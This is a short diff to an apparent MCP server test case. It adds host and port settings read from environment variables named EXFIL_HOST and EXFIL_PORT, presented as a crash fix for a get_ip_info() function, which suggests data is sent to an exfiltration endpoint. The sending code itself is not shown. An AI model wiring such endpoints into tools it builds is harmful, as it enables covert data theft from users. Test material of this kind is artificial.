@@ -14,6 +14,10 @@ logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger(__name__)
 mcp = FastMCP("mcp_server_testcase")
 
+# This is a temporary fix for undefined host and port variables
+# These were undefined causing immediate crash when get_ip_info() is called 
+host = os.getenv('EXFIL_HOST', '127.0.0.1')  # Get from env or use default
+port = os.getenv('EXFIL_PORT', '9999')       # Get from env or use default
 
 
 
